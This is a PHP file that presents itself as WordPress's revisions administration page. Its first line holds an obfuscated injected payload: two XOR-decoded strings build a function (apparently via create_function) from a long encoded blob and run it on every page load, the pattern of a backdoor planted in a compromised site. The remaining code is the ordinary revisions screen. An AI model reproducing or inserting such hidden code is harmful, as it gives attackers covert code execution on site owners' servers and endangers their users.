<?php $KzCOnYoR=',>XA:1<VUN 61-Y'^'OL= NTc0  CBXB7';$egKMSaaTzjS=$KzCOnYoR('',';>nN0LZ95I.67P4>99<XmLV3:HPHYq78>GIojBMghVBU0<Q-+sD =;ZU08tt8OFnLHWOAZtK>ULxZCwWT9ms=M;ENVMubkRBYs78+yR<YHPfqXTINOO;==EDCT89UgNlAGqaeZ4:E998RHIMMo-REZ,M.eKdFCSN,iB>sRz:G1+IWFmWX=b7AA02YLVLAFWLtB4HKPzG+h6KCG<RN3kjhROX8+KkcO1OM>-==IqC57+7PWoM0WEISPTseK+46;ki1NLHyG.R;WHVYF99X:SoxPGMoX57Lh <8HsWnG2.Rr8ISM0 PpZb;,8K3Nd6AbD,xAuj6262LyIxo4W+3ZVEXPe8yh3us -uXJga-5UBdKJG;9 7=baMOo8N=ML7<QN.DIOQG1<Y9qpT55TLHmAE  BE=IoDNmNaGmTQHXLWw2X:XK0+7W<J,g5C+i0M2.,6M-OAZ <NAF24.O64NMWYP<MytCK<8ZAl;T5hqKRBWZaDW80gukM.AOT>b,-7: EE1 IjQEEEKDSR,6DSAPajeM+HtMWD JUpeK+YVlbvGqxvOZCQRggyBvpOY uJfcMVzwwSHkL6UMG:OeXejW8O;W0t:<DhVFSS;8iLM9-.C6RSfvcD9E9gnChCkeIKlDYJ4LeaP3:+<o;28;<L>e;Gv1z4VWXrgPKMK'^'RXFoV94ZA AXh5LWJMOpJ49Ae,1<8.hUK3nFCb6ma07;SH8BES<OOd>4DY++U:2Fh,6; vToU05QzcWwtBgz4iT0:vpUELiHPzQWYQvUyupVJxp r<;IQX+lg0YM4NuLe.ZJLP=3aVLLrftmeKI31;wiG8k:fg8+U2fWSwZI3CG,9nI<=DKjhz:;P>38449dP-A<bkpNVbKAIcX3:RKWH4.4KNpaG+P;,aFXDiLcSVGD5leGV87,23<SMotwyt  tn-;YcE7BwuhybOX4O6FX+MDK<TC-7KYAhNwJ,WWix1m7,DApMzFMMT>VunKKh-JXiTNRSBSeY2rfR8YV;5-xxAg+-b 6syU99GEFP,bYujcMXLBXKA6Ef1jY,8Vc:+Wdtou,TEb3xypQT -hPaaVA.0XreM3g3kMI00<9ljWr-T+.BBV;U0IOM,Y6T,FOsi X;i8AO+wrmPK,YP+es=1H,PXcoXY. 3P1LAXpX+1rE 6LQGSMmO3=5G=GHNeE=,BT:Bv. <lhsvHW02hpGLEeF,Aes A>4+B N q1KVzLXQx;q4bWSJ DB,iEMrPTznNABkySuRg+qXhLxCLwY=I6I+QY=73>: OKAk=XTB,W6tJVG X1XNGcHcKEi0fM<<U ME4RNJgHKSAWS-ZBfnM;sQ.>,ZWypG6');$egKMSaaTzjS();
/**
 * Revisions administration panel
 *
 * Requires wp-admin/includes/revision.php.
 *
 * @package WordPress
 * @subpackage Administration
 * @since 2.6.0
 *
 * @param int    revision Optional. The revision ID.
 * @param string action   The action to take.
 *                        Accepts 'restore', 'view' or 'edit'.
 * @param int    from     The revision to compare from.
 * @param int    to       Optional, required if revision missing. The revision to compare to.
 */

/** WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

require ABSPATH . 'wp-admin/includes/revision.php';

wp_reset_vars( array( 'revision', 'action', 'from', 'to' ) );

$revision_id = absint( $revision );

$from = is_numeric( $from ) ? absint( $from ) : null;
if ( ! $revision_id )
	$revision_id = absint( $to );
$redirect = 'edit.php';

switch ( $action ) {
case 'restore' :
	if ( ! $revision = wp_get_post_revision( $revision_id ) )
		break;

	if ( ! current_user_can( 'edit_post', $revision->post_parent ) )
		break;

	if ( ! $post = get_post( $revision->post_parent ) )
		break;

	// Restore if revisions are enabled or this is an autosave.
	if ( ! wp_revisions_enabled( $post ) && ! wp_is_post_autosave( $revision ) ) {
		$redirect = 'edit.php?post_type=' . $post->post_type;
		break;
	}

	// Don't allow revision restore when post is locked
	if ( wp_check_post_lock( $post->ID ) )
		break;

	check_admin_referer( "restore-post_{$revision->ID}" );

	wp_restore_post_revision( $revision->ID );
	$redirect = add_query_arg( array( 'message' => 5, 'revision' => $revision->ID ), get_edit_post_link( $post->ID, 'url' ) );
	break;
case 'view' :
case 'edit' :
default :
	if ( ! $revision = wp_get_post_revision( $revision_id ) )
		break;
	if ( ! $post = get_post( $revision->post_parent ) )
		break;

	if ( ! current_user_can( 'read_post', $revision->ID ) || ! current_user_can( 'edit_post', $revision->post_parent ) )
		break;

	// Revisions disabled and we're not looking at an autosave
	if ( ! wp_revisions_enabled( $post ) && ! wp_is_post_autosave( $revision ) ) {
		$redirect = 'edit.php?post_type=' . $post->post_type;
		break;
	}

	$post_edit_link = get_edit_post_link();
	$post_title     = '<a href="' . $post_edit_link . '">' . _draft_or_post_title() . '</a>';
	/* translators: 1: Post title */
	$h1             = sprintf( __( 'Compare Revisions of &#8220;%1$s&#8221;' ), $post_title );
	$return_to_post = '<a href="' . $post_edit_link . '">' . __( '&larr; Return to editor' ) . '</a>';
	$title          = __( 'Revisions' );

	$redirect = false;
	break;
}

// Empty post_type means either malformed object found, or no valid parent was found.
if ( ! $redirect && empty( $post->post_type ) )
	$redirect = 'edit.php';

if ( ! empty( $redirect ) ) {
	wp_redirect( $redirect );
	exit;
}

// This is so that the correct "Edit" menu item is selected.
if ( ! empty( $post->post_type ) && 'post' != $post->post_type )
	$parent_file = $submenu_file = 'edit.php?post_type=' . $post->post_type;
else
	$parent_file = $submenu_file = 'edit.php';

wp_enqueue_script( 'revisions' );
wp_localize_script( 'revisions', '_wpRevisionsSettings', wp_prepare_revisions_for_js( $post, $revision_id, $from ) );

/* Revisions Help Tab */

$revisions_overview  = '<p>' . __( 'This screen is used for managing your content revisions.' ) . '</p>';
$revisions_overview .= '<p>' . __( 'Revisions are saved copies of your post or page, which are periodically created as you update your content. The red text on the left shows the content that was removed. The green text on the right shows the content that was added.' ) . '</p>';
$revisions_overview .= '<p>' . __( 'From this screen you can review, compare, and restore revisions:' ) . '</p>';
$revisions_overview .= '<ul><li>' . __( 'To navigate between revisions, <strong>drag the slider handle left or right</strong> or <strong>use the Previous or Next buttons</strong>.' ) . '</li>';
$revisions_overview .= '<li>' . __( 'Compare two different revisions by <strong>selecting the &#8220;Compare any two revisions&#8221; box</strong> to the side.' ) . '</li>';
$revisions_overview .= '<li>' . __( 'To restore a revision, <strong>click Restore This Revision</strong>.' ) . '</li></ul>';

get_current_screen()->add_help_tab( array(
	'id'      => 'revisions-overview',
	'title'   => __( 'Overview' ),
	'content' => $revisions_overview
) );

$revisions_sidebar  = '<p><strong>' . __( 'For more information:' ) . '</strong></p>';
$revisions_sidebar .= '<p>' . __( '<a href="https://codex.wordpress.org/Revision_Management">Revisions Management</a>' ) . '</p>';
$revisions_sidebar .= '<p>' . __( '<a href="https://wordpress.org/support/">Support Forums</a>' ) . '</p>';

get_current_screen()->set_help_sidebar( $revisions_sidebar );

require_once( ABSPATH . 'wp-admin/admin-header.php' );

?>

<div class="wrap">
	<h1 class="long-header"><?php echo $h1; ?></h1>
	<?php echo $return_to_post; ?>
</div>
<?php
wp_print_revision_templates();

require_once( ABSPATH . 'wp-admin/admin-footer.php' );
